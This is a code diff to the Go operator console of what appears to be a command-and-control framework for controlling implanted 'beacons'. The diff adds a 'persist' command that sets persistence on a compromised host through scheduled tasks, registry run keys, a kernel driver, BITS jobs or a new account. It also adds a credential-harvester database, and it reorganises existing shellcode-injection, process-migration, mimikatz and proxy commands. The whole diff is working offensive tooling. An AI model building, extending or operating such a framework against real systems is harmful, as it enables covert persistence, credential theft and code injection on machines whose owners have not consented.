@@ -16,6 +16,15 @@ import (
 	"time"
 )
 
+// persistence methods
+const (
+	SCHTASKS     int = 0x1
+	REGRUNKEY    int = 0x2
+	KERNELDRIVER int = 0x4
+	BITSJOB      int = 0x8
+	NEWACCOUNT   int = 0x10
+)
+
 type CommandUpdate struct {
 	Ip           string
 	Id           string
@@ -53,12 +62,14 @@ type BeaconMessage struct {
 
 const idBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 
+var webPort int
 var idLen int = 8
 var listeners []*HttpListener = make([]*HttpListener, 0)
 var beacons []*Beacon = make([]*Beacon, 0)
 var modules []*Module = make([]*Module, 0)
 var activeBeacon *Beacon
 var securityContext *SecurityContext
+var credHarvester *CredentialDB
 var activeBeaconInteractive = false
 var cmdArgs = map[string]string{
 	"help":         "<command>...",
@@ -76,6 +87,7 @@ var cmdArgs = map[string]string{
 	"shellcode": "<path to shellcode> <PID>",
 	"migrate":   "<PID>",
 	"plist":     "",
+	"persist":   "<REGRUNKEY or SCHTASK or ALL>",
 }
 
 func getIfaceIp(iface string) string {
@@ -500,42 +512,57 @@ func processInput(input string) {
 				}
 			case "shellcode":
 				injectShellcode(cmd)
-			case "migrate":
-				migrateBeacon(cmd)
 			case "help":
 				printHelp(cmd)
-			case "mod":
-				if activeBeacon != nil || cmd[1] == "list" {
-					execModuleOnBeacon(cmd)
-				} else {
-					info("Interact with a beacon first (use).")
-				}
-			case "plist":
-				if activeBeacon != nil {
-					execOnBeacon(append(cmd, "plist"))
-				} else {
-					info("Interact with a beacon first (use).")
-				}
-			case "mimikatz":
-				if activeBeacon != nil {
-					execOnBeacon(append([]string{"exec"}, cmd...))
-				} else {
-					info("Interact with a beacon first (use).")
-				}
-			case "client":
-				if activeBeacon != nil && len(cmd) == 2 {
-					for i, pBeacon := range activeBeacon.ProxyClients {
-						if pBeacon == cmd[1] {
-							info("Already a client. Resending handshake.")
-							activeBeacon.ProxyClients = append(activeBeacon.ProxyClients[:i], activeBeacon.ProxyClients[i+1:]...)
-						}
-					}
-
-					info("Adding " + cmd[1] + " as client.")
-					notifyBeaconOfProxyUpdate(activeBeacon, cmd[1])
-				}
 			default:
-				info(cmd[0] + " is not a command. Use help to show available commands.")
+				if activeBeacon != nil {
+					switch cmd[0] {
+					case "migrate":
+						migrateBeacon(cmd)
+					case "persist":
+						var bitmap int
+						for _, b := range strings.Split(strings.ToLower(cmd[1]), ",") {
+							switch b {
+							case "schtask":
+								bitmap |= SCHTASKS
+							case "regrunkey":
+								bitmap |= REGRUNKEY
+							case "kerneldriver":
+								bitmap |= KERNELDRIVER
+							case "bitsjob":
+								bitmap |= BITSJOB
+							case "newaccount":
+								bitmap |= NEWACCOUNT
+							case "all":
+								bitmap |= NEWACCOUNT | BITSJOB | KERNELDRIVER | REGRUNKEY | SCHTASKS
+							}
+						}
+						fmt.Println([]string{"exec", "persist", fmt.Sprint(bitmap)})
+						execOnBeacon([]string{"exec", "persist", fmt.Sprint(bitmap)})
+					case "mod":
+						execModuleOnBeacon(cmd)
+					case "plist":
+						execOnBeacon(append(cmd, "plist"))
+					case "mimikatz":
+						execOnBeacon(append([]string{"exec"}, cmd...))
+					case "client":
+						if len(cmd) == 2 {
+							for i, pBeacon := range activeBeacon.ProxyClients {
+								if pBeacon == cmd[1] {
+									info("Already a client. Resending handshake.")
+									activeBeacon.ProxyClients = append(activeBeacon.ProxyClients[:i], activeBeacon.ProxyClients[i+1:]...)
+								}
+							}
+
+							info("Adding " + cmd[1] + " as client.")
+							notifyBeaconOfProxyUpdate(activeBeacon, cmd[1])
+						}
+					default:
+						info(cmd[0] + " is not a command. Use help to show available commands.")
+					}
+				} else {
+					info("Interact with a beacon first (use).")
+				}
 			}
 		}
 	}
@@ -622,11 +649,15 @@ func main() {
 	flag.Parse()
 
 	securityContext = newSecurityContext()
+	credHarvester := &CredentialDB{}
+	credHarvester.loadCreds()
 
 	var WebInterface = WebInterface{
 		ip:   *iface,
 		port: *port,
 	}
+
+	webPort = *port
 
 	var err = WebInterface.startListener()
 	if err != nil {
